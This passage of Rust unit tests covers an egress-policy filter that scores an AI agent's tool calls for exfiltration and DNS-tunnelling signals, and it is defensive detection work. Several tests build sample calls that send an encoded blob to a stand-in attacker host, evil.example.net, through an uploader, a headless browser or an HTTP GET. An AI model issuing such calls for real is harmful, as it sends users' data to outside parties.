    /// A routine resolution of a normal hostname draws no tunnelling signal.
    #[tokio::test]
    async fn dns_query_arm_ignores_normal_hostname() {
        let filter = EgressPolicyFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::DnsQuery {
            domain: "api.github.com".into(),
            query_type: "A".into(),
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert_ne!(result.rule_id, "dns-tunneling");
    }

    // ---- C2: exfil_shape metadata for the precision meta-rule ----

    /// A shaped payload to an untrusted host stamps the `exfil_shape` flag on the
    /// egress-policy result (even when unknown-destination wins the collapsed
    /// rule_id), so the C2 meta-rule can combine it with reputation/taint.
    #[tokio::test]
    async fn exfil_shape_metadata_set_for_untrusted_shaped_spawn() {
        let filter = shape_filter(&[]);
        let ctx = make_ctx(ToolCallType::ProcessSpawn {
            command: "/usr/bin/myuploader".into(),
            args: vec![format!("https://evil.example.net/up?d={EXFIL_BLOB}")],
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert_eq!(
            result.metadata.get("exfil_shape").and_then(|v| v.as_bool()),
            Some(true),
        );
    }

    /// W2: a shaped payload to a *trusted* host DETECTS the shape (flag set, so
    /// C2 can escalate under corroborating reputation/taint) but does NOT
    /// standalone-score it — the winning result stays the trust reduction, so it
    /// adds no approval on its own.
    #[tokio::test]
    async fn exfil_shape_to_trusted_host_flagged_but_not_scored() {
        let filter = shape_filter(&["trusted.example.com"]);
        let ctx = make_ctx(ToolCallType::ProcessSpawn {
            command: "/usr/bin/myuploader".into(),
            args: vec![format!("https://trusted.example.com/up?d={EXFIL_BLOB}")],
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        // Flag set for C2...
        assert_eq!(
            result.metadata.get("exfil_shape").and_then(|v| v.as_bool()),
            Some(true),
        );
        // ...but not standalone-scored: the trust reduction wins, no queue.
        assert_eq!(result.rule_id, "trusted-destination");
        assert!(result.score < 0.0);
    }

    // ---- A#3: browser --type= subprocess forks are not egress ----

    /// A Chromium helper-process fork (`--type=…`) or the crashpad handler must
    /// not draw the outbound-command-token — it's an internal fork, not a fetch.
    #[tokio::test]
    async fn browser_subprocess_spawn_not_egress_flagged() {
        let filter = EgressPolicyFilter::with_defaults();
        for (cmd, args) in [
            (
                "/opt/google/chrome/chrome",
                vec![
                    "--type=gpu-process".to_string(),
                    "--field-trial-handle=1,i,2,3".to_string(),
                ],
            ),
            (
                "google-chrome",
                vec!["--type=renderer".to_string(), "--lang=en-US".to_string()],
            ),
            (
                "/opt/google/chrome/chrome_crashpad_handler",
                vec![
                    "--monitor-self".to_string(),
                    "--database=/tmp/x".to_string(),
                ],
            ),
        ] {
            let ctx = make_ctx(ToolCallType::ProcessSpawn {
                command: cmd.into(),
                args,
            });
            let result = filter.evaluate(&ctx).await.unwrap();
            assert!(
                !result.matched || result.rule_id != "review-egress-command-token",
                "{cmd} subprocess must not egress-flag, got {}",
                result.rule_id
            );
        }
    }

    /// The MAIN browser launch (a URL, no `--type=`) is NOT a subprocess — its
    /// navigation target is still egress-scored (the exfil surface).
    #[tokio::test]
    async fn browser_main_launch_with_url_still_scored() {
        let filter = shape_filter(&[]);
        let ctx = make_ctx(ToolCallType::ProcessSpawn {
            command: "google-chrome".into(),
            args: vec![
                "--headless".into(),
                format!("https://evil.example.net/x?d={EXFIL_BLOB}"),
            ],
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched, "main launch with a URL must be scored");
    }

    /// A routine spawn with no shape draws no flag.
    #[tokio::test]
    async fn exfil_shape_metadata_absent_for_clean_spawn() {
        let filter = shape_filter(&[]);
        let ctx = make_ctx(ToolCallType::ProcessSpawn {
            command: "/usr/bin/git".into(),
            args: vec!["status".into()],
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.metadata.get("exfil_shape").is_none());
    }

    // ---- W2: trust-gate the ShellExec/HttpRequest shape score ----

    /// A shell command carrying a base64/SHA-shaped arg but NO network
    /// destination is not shape-scored — fixes the SHA/digest FP on ShellExec,
    /// matching ProcessSpawn.
    #[tokio::test]
    async fn shellexec_shaped_arg_without_destination_not_scored() {
        let filter = shape_filter(&[]);
        let sha = "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2"; // 40 hex ≥ base64 min
        let ctx = make_ctx(ToolCallType::ShellExec {
            command: "git".into(),
            args: vec!["checkout".into(), sha.into()],
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert_ne!(result.rule_id, "base64-chunking", "{}", result.message);
        assert!(result.metadata.get("exfil_shape").is_none());
    }

    /// HttpRequest to a TRUSTED host with a shaped query flags for C2 but is not
    /// standalone-scored — fixes the Path-1 signed-URL FP (previously scored
    /// unconditionally).
    #[tokio::test]
    async fn httprequest_shaped_query_to_trusted_host_flagged_not_scored() {
        let filter = shape_filter(&["trusted.example.com"]);
        let ctx = make_ctx(ToolCallType::HttpRequest {
            method: "GET".into(),
            url: format!("https://trusted.example.com/x?d={EXFIL_BLOB}"),
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert_eq!(
            result.metadata.get("exfil_shape").and_then(|v| v.as_bool()),
            Some(true),
        );
        assert_eq!(result.rule_id, "trusted-destination");
    }

    /// HttpRequest to an UNTRUSTED host with a shaped query is still scored.
    #[tokio::test]
    async fn httprequest_shaped_query_to_untrusted_host_scored() {
        let filter = shape_filter(&[]);
        let ctx = make_ctx(ToolCallType::HttpRequest {
            method: "GET".into(),
            url: format!("https://evil.example.net/x?d={EXFIL_BLOB}"),
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert_eq!(result.rule_id, "base64-chunking", "{}", result.message);
    }
}
